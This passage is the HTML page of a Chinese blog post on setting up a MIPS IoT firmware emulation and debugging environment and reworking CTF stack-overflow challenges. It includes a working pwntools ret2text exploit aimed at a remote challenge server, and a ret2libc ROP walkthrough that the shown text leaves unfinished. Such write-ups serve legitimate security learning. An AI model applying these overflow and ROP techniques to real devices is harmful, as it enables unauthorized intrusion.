@@ -1,0 +1,541 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>IOT固件mips环境安装与漏洞复现 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、mips的编译环境安装1、下载buildroot123wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapsho,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">IOT固件mips环境安装与漏洞复现</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/兴趣研究"><b>「
+                    </b>兴趣研究<b> 」</b></a>
+                
+                May 17, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/05/17/IOT%E5%9B%BA%E4%BB%B6mips%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="IOT固件mips环境安装与漏洞复现" class="">IOT固件mips环境安装与漏洞复现</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    45k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    41 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/iot%E5%9B%BA%E4%BB%B6/" rel="tag">iot固件</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="一、mips的编译环境安装"><a href="#一、mips的编译环境安装" class="headerlink" title="一、mips的编译环境安装"></a>一、mips的编译环境安装</h3><h4 id="1、下载buildroot"><a href="#1、下载buildroot" class="headerlink" title="1、下载buildroot"></a>1、下载buildroot</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2</span></span><br><span class="line">tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">cd buildroot</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h4 id="2、配置buildroot"><a href="#2、配置buildroot" class="headerlink" title="2、配置buildroot"></a>2、配置buildroot</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install libncurses-dev patch</span><br><span class="line">make clean</span><br><span class="line">make qemu_mips32r2el_malta_defconfig</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、在出现界面后，选择第一项“Target-Architecture”，然后选择mips那个即可"><a href="#3、在出现界面后，选择第一项“Target-Architecture”，然后选择mips那个即可" class="headerlink" title="3、在出现界面后，选择第一项“Target Architecture”，然后选择mips那个即可"></a>3、在出现界面后，选择第一项“Target Architecture”，然后选择mips那个即可</h4><h4 id="4、编译环境的make"><a href="#4、编译环境的make" class="headerlink" title="4、编译环境的make"></a>4、编译环境的make</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install texinfo</span><br><span class="line">sudo apt-<span class="built_in">get</span> install bison</span><br><span class="line">sudo apt-<span class="built_in">get</span> install flex</span><br><span class="line">sudo make</span><br></pre></td></tr></table></figure>
+
+<p>这里要等n久，所以可以先搞点自己的事</p>
+<h4 id="5、将编译器mips-linux-gcc设置为全局状态"><a href="#5、将编译器mips-linux-gcc设置为全局状态" class="headerlink" title="5、将编译器mips-linux-gcc设置为全局状态"></a>5、将编译器mips-linux-gcc设置为全局状态</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.bashrc</span><br><span class="line"><span class="keyword">export</span> PATH=$PATH:/Your_Path/buildroot/output/host/usr/bin</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<h4 id="6、编译生成mips的程序"><a href="#6、编译生成mips的程序" class="headerlink" title="6、编译生成mips的程序"></a>6、编译生成mips的程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gcc -o hello hello.c -<span class="keyword">static</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="7、firmadyne"><a href="#7、firmadyne" class="headerlink" title="7、firmadyne"></a>7、firmadyne</h4><p>这是个路由器固件的仿真环境，环境如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan</span><br><span class="line"></span><br><span class="line">git clone --recursive https://github.com/firmadyne/firmadyne.git</span><br><span class="line">之后要进入到文件夹内,修改firmadyne.config,将其中的</span><br><span class="line"></span><br><span class="line">FIRMWARE_DIR=/home/vagrant/firmadyne/</span><br><span class="line">修改为完整路径</span><br><span class="line">然后可以执行安装</span><br><span class="line"></span><br><span class="line">sudo ./download.sh</span><br><span class="line">sudo -H pip install git+https://github.com/ahupp/python-magic</span><br><span class="line">sudo -H pip install git+https://github.com/sviehb/jefferson</span><br><span class="line">sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils</span><br><span class="line">sudo apt-get install postgresql</span><br><span class="line">sudo -u postgres createuser -P firmadyne</span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line">sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二、动态调试环境安装"><a href="#二、动态调试环境安装" class="headerlink" title="二、动态调试环境安装"></a>二、动态调试环境安装</h3><h4 id="1、qume模拟器的安装"><a href="#1、qume模拟器的安装" class="headerlink" title="1、qume模拟器的安装"></a>1、qume模拟器的安装</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install qemu</span><br><span class="line">apt-<span class="built_in">get</span> install qemu binfmt-support qemu-user-<span class="keyword">static</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2、gdb-multiarch的安装"><a href="#2、gdb-multiarch的安装" class="headerlink" title="2、gdb-multiarch的安装"></a>2、gdb-multiarch的安装</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install gdb-multiarch</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、mips程序的运行、反编译和调试方法"><a href="#三、mips程序的运行、反编译和调试方法" class="headerlink" title="三、mips程序的运行、反编译和调试方法"></a>三、mips程序的运行、反编译和调试方法</h3><h4 id="1、单纯运行"><a href="#1、单纯运行" class="headerlink" title="1、单纯运行"></a>1、单纯运行</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel ./hello</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、gdb-multiarch动态调试挂载"><a href="#2、gdb-multiarch动态调试挂载" class="headerlink" title="2、gdb-multiarch动态调试挂载"></a>2、gdb-multiarch动态调试挂载</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g <span class="number">1234</span> -L /Your_Path/buildroot/output/target/ ./hello <span class="comment">//窗口a</span></span><br><span class="line">gdb-multiarch hello <span class="comment">//窗口b</span></span><br><span class="line">target remote: <span class="number">1234</span>  <span class="comment">//gdb界面</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3、jeb-mips静态分析"><a href="#3、jeb-mips静态分析" class="headerlink" title="3、jeb-mips静态分析"></a>3、jeb-mips静态分析</h4><p>下载jeb-mips软件，这个是专门用来分析mips程序的，目前只有测试版的jeb-mips可以用，但是已经够用了。</p>
+<p>Jeb-mips下载地址：<a href="https://www.pnfsoftware.com/jeb2/mips（梯子记得开全局）" target="_blank" rel="noopener">https://www.pnfsoftware.com/jeb2/mips（梯子记得开全局）</a></p>
+<p>看看效果</p>
+<p><img src="/blog_img/image-20200517230231911.png" alt="image-20200517230231911"></p>
+<p>还有个找gadget的脚本叫做pleaserop，这里附上地址：<a href="https://github.com/pnfsoftware/PleaseROP" target="_blank" rel="noopener">https://github.com/pnfsoftware/PleaseROP</a></p>
+<p>只要把下载下来的PleaseRopPlugin-1.0.1.jar放到jeb文件夹中的coreplugins中即可</p>
+<p><img src="/blog_img/image-20200517230836505.png" alt="image-20200517230836505"></p>
+<p>测试下效果</p>
+<p><img src="/blog_img/image-20200517230401565.png" alt="image-20200517230401565"></p>
+<p>可以找到想要的gadget</p>
+<p><img src="/blog_img/image-20200517230500075.png" alt="image-20200517230500075"></p>
+<h4 id="4、ida的静态分析"><a href="#4、ida的静态分析" class="headerlink" title="4、ida的静态分析"></a>4、ida的静态分析</h4><p>ida中主要有一个mips的ropgadget的一个使用，这里需要安装一个工具mipsrop.py，附上github地址：</p>
+<p><a href="https://github.com/devttys0/ida/tree/master/plugins/mipsrop" target="_blank" rel="noopener">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</a></p>
+<p>使用方法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.help()</span><br><span class="line"></span><br><span class="line">mipsrop.find(instruction_string)</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">        Locates all potential ROP gadgets that contain the specified instruction.</span><br><span class="line"><span class="meta">        @instruction_string - The instruction you need executed. This can be either a:</span></span><br><span class="line">                    o Full instruction    - <span class="string">"li $a0, 1"</span></span><br><span class="line">                    o Partial instruction - <span class="string">"li $a0"</span></span><br><span class="line">                    o Regex instruction   - <span class="string">"li $a0, .*"</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">mipsrop.system()</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">        Prints a list of gadgets that may be used to call system().</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">mipsrop.doubles()</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">        Prints a list of all <span class="string">"double jump"</span> gadgets (useful <span class="keyword">for</span> function calls).</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">mipsrop.stackfinders()</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">        Prints a list of all gadgets that put a stack address into a register.</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">mipsrop.tails()</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">        Prints a lits of all tail call gadgets (useful <span class="keyword">for</span> function calls).</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">mipsrop.set_base()</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">        Set base address used <span class="keyword">for</span> display</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">mipsrop.summary()</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">        Prints a summary of your currently marked ROP gadgets, <span class="keyword">in</span> alphabetical order by the marked name.</span><br><span class="line">        To mark a location <span class="keyword">as</span> a ROP gadget, simply mark the position <span class="keyword">in</span> IDA (Alt+M) <span class="keyword">with</span> any name that starts <span class="keyword">with</span> <span class="string">"ROP"</span>.</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、mips的汇编和常用的知识点总结"><a href="#四、mips的汇编和常用的知识点总结" class="headerlink" title="四、mips的汇编和常用的知识点总结"></a>四、mips的汇编和常用的知识点总结</h3><p>1、认识寄存器</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$zero 第<span class="number">0</span>号寄存器，其值始终为<span class="number">0</span></span><br><span class="line">$at  保留寄存器</span><br><span class="line">$v0-$v1 保存表达式或者函数返回结果</span><br><span class="line">$a0-$a3 作为函数的前<span class="number">4</span>个参数</span><br><span class="line">$t0-$t7 临时寄存器，可以存值</span><br><span class="line">$s0-$s7 子函数使用时必须要保存原来寄存器的值</span><br><span class="line">$t8-$t9 补充t0-t7</span><br><span class="line">$k0-$k1 保留，中断处理函数使用</span><br><span class="line">$gp 全局指针</span><br><span class="line">$sp 栈顶指针</span><br><span class="line">$fp 保存栈指针</span><br><span class="line">$ra 返回地址</span><br></pre></td></tr></table></figure>
+
+<p>2、认识汇编语句</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">一、load/store指令</span><br><span class="line">la $t0,val_l <span class="comment">//存地址</span></span><br><span class="line">li $t1,<span class="number">0x20</span>  <span class="comment">//存值</span></span><br><span class="line">lw $s0,<span class="number">0</span>($sp) <span class="comment">//取堆栈中偏移为0的地址上4字节的值</span></span><br><span class="line">sw $a0,<span class="number">0</span>($sp)  <span class="comment">//存值到堆栈中</span></span><br><span class="line"><span class="built_in">move</span> $t5,$t1  <span class="comment">//$t5=$t1</span></span><br><span class="line">二、算术运算指令</span><br><span class="line">add,$t0,$t1,$t3  <span class="comment">//$t0=$t3+$t1</span></span><br><span class="line">sub,$t0,$t1,$t3  <span class="comment">//$t0=$t3-$t1</span></span><br><span class="line">addi,$t0,$t1,<span class="number">5</span>  <span class="comment">//$t0=$t3+5</span></span><br><span class="line">addu,$t0,$t1,$t3  <span class="comment">//$t0=$t3+$t1,无符号</span></span><br><span class="line">subu,$t0,$t1,$t3  <span class="comment">//$t0=$t3-$t1,无符号</span></span><br><span class="line">mult $t3,$t4  <span class="comment">//(Hi,Lo)=$t3*$t4</span></span><br><span class="line">div $t3,$t4   <span class="comment">//(Lo,Hi)=（商，余数）</span></span><br><span class="line">mfhi $t0 <span class="comment">//$t0=$Hi</span></span><br><span class="line">mflo $t1 <span class="comment">//$t1=$Lo</span></span><br><span class="line">三、类比较指令</span><br><span class="line">slt $v0,$a0,$s0 <span class="comment">//如果$a0小于$s0,设置$v0=1,否则为0</span></span><br><span class="line">slti $v0,$a0,<span class="number">244</span> <span class="comment">//如果$a0小于244,设置$v0=1,否则为0</span></span><br><span class="line">四、syscall</span><br><span class="line"><span class="comment">//产生一个软中断，实现系统调用</span></span><br><span class="line">五、分支跳转指令</span><br><span class="line">b <span class="number">0x400828</span>   <span class="comment">//jmp 0x400828</span></span><br><span class="line">beq $t0,$t1,<span class="number">0x400828</span> <span class="comment">//je 0x400828</span></span><br><span class="line">blt $t0,$t1,<span class="number">0x400828</span> <span class="comment">//小于跳转</span></span><br><span class="line">ble $t0,$t1,<span class="number">0x400828</span> <span class="comment">//小于等于跳转</span></span><br><span class="line">bgt $t0,$t1,<span class="number">0x400828</span> <span class="comment">//大于跳转</span></span><br><span class="line">bge $t0,$t1,<span class="number">0x400828</span> <span class="comment">//大于等于跳转</span></span><br><span class="line">bne $t0,$t1,<span class="number">0x400828</span> <span class="comment">//jne 0x400828</span></span><br><span class="line">bal <span class="number">0x400828</span> <span class="comment">//调用函数</span></span><br><span class="line">六、跳转指令</span><br><span class="line">j <span class="number">0x400828</span> <span class="comment">//jmp</span></span><br><span class="line">jr $t3  <span class="comment">//$t3=0x400828</span></span><br><span class="line">jal <span class="number">0x400828</span> <span class="comment">//调用 0x400828;sw $ra=0x40082c</span></span><br></pre></td></tr></table></figure>
+
+<p>3、函数</p>
+<p>叶子函数：当前函数不再调用其他函数，函数调用时，返回地址压入$ra，比较难实现利用</p>
+<p>非叶子函数：当前函数调用其他函数，函数调用时，返回地址压入栈中，比较容易实现利用</p>
+<h3 id="五、ctf中的题目复现"><a href="#五、ctf中的题目复现" class="headerlink" title="五、ctf中的题目复现"></a>五、ctf中的题目复现</h3><p>1、ret2text</p>
+<p>栈溢出跳转到后门</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_elf = <span class="string">'./test'</span></span><br><span class="line">context.binary = bin_elf</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mipsel"</span>, <span class="string">"-L"</span>, <span class="string">"/home/v1ct0r/buildroot/output/target"</span>, bin_elf])</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mipsel"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/home/v1ct0r/buildroot/output/target"</span>, bin_elf])</span><br><span class="line"></span><br><span class="line">elf = ELF(bin_elf)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.0"</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40043c</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">py += <span class="string">'bbbb'</span></span><br><span class="line">py += p32(backdoor)</span><br><span class="line">ru(<span class="string">"just do it~"</span>)</span><br><span class="line">sl(py)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>3、ret2libc</p>
+<p>这里是安讯杯一道题，保护全开</p>
+<p><img src="/blog_img/image-20200520102424936.png" alt="image-20200520102424936"></p>
+<p>在vuln中有栈溢出的漏洞存在，这里没有后门什么的，所以是典型的泄漏地址去打的题目</p>
+<p>所以第一步我们需要构造好payload，先实现rop链进行函数调用，这里关键就是找rop链，先找到从栈中取数据到寄存器的rop：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.find(<span class="string">"lw"</span>)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x0040053C</span>  |  lw $ra,<span class="number">0x20</span>+var_4($sp)                              |  jr    <span class="number">0x20</span>+var_4($sp)                 |</span><br><span class="line">|  <span class="number">0x00400788</span>  |  lw $a1,arg_18($fp)                                  |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x004007A8</span>  |  lw $ra,arg_24($sp)                                  |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x00400858</span>  |  lw $v0,(stdin - <span class="number">0x410BAC</span>)($v0)                      |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x0040087C</span>  |  lw $v0,(stdout - <span class="number">0x410BC0</span>)($v0)                     |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x00400898</span>  |  lw $gp,<span class="number">0x38</span>+var_28($fp)                             |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x004008BC</span>  |  lw $gp,<span class="number">0x38</span>+var_28($fp)                             |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x004008D8</span>  |  lw $gp,<span class="number">0x38</span>+var_28($fp)                             |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x004008F4</span>  |  lw $gp,<span class="number">0x38</span>+var_28($fp)                             |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x00400918</span>  |  lw $gp,<span class="number">0x38</span>+var_28($fp)                             |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x004006C8</span>  |  lw $ra,<span class="number">0x30</span>+var_4($sp)                              |  jr    <span class="number">0x30</span>+var_4($sp)                 |</span><br><span class="line">|  <span class="number">0x0040080C</span>  |  lw $ra,<span class="number">0x40</span>+var_4($sp)                              |  jr    <span class="number">0x40</span>+var_4($sp)                 |</span><br><span class="line">|  <span class="number">0x00400954</span>  |  lw $ra,<span class="number">0x38</span>+var_4($sp)                              |  jr    <span class="number">0x38</span>+var_4($sp)                 |</span><br><span class="line">|  <span class="number">0x00400994</span>  |  lw $ra,<span class="number">0x28</span>+var_4($sp)                              |  jr    <span class="number">0x28</span>+var_4($sp)                 |</span><br><span class="line">|  <span class="number">0x00400A7C</span>  |  lw $ra,<span class="number">0x20</span>+var_4($sp)                              |  jr    <span class="number">0x20</span>+var_4($sp)                 |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>这里我们发现从0x4006c8往下的的gadget都是从栈中的偏移处取值到寄存器中，同时ret跳转的地址也是在栈中，这样我们就可以控制程序的执行流程了，选取0x4006c8：</p>
